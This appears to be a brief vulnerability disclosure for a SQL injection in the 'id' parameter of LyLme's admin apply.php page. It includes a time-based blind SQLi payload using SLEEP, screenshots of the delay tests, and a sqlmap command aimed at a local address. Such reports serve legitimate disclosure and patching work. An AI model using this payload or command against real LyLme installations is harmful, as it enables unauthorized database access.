# SQL injection exists in LyLme
![image](https://github.com/tangzhaosong/Excavate/assets/100182502/75ae7f42-4f50-4ac9-9612-883034ff3b27)

<br>**Vulnerability function points, concatenated according to code routing, we get /admin/apply.php? set=edit&id=1

Injection point id

Here delay injection to prove the injection point, write

payload: 1' AND (SELECT 5289 FROM (SELECT(SLEEP(5)) enfo)-- ihbh**</br>
![image](https://github.com/tangzhaosong/Excavate/assets/100182502/be2226be-c8a1-41dd-9cdb-73763621a31c)
<br>Change sleep (1)</br>
![image](https://github.com/tangzhaosong/Excavate/assets/100182502/69cecb47-befc-4b32-9e42-2e8e15e37f2d)
<br>**Vulnerability exists

Attack using SQLMAP

SQLMAP:

Python sqlmap. Py - u "http://192.168.30.203/admin/apply.php? set=edit&id=1" -p id**</br>
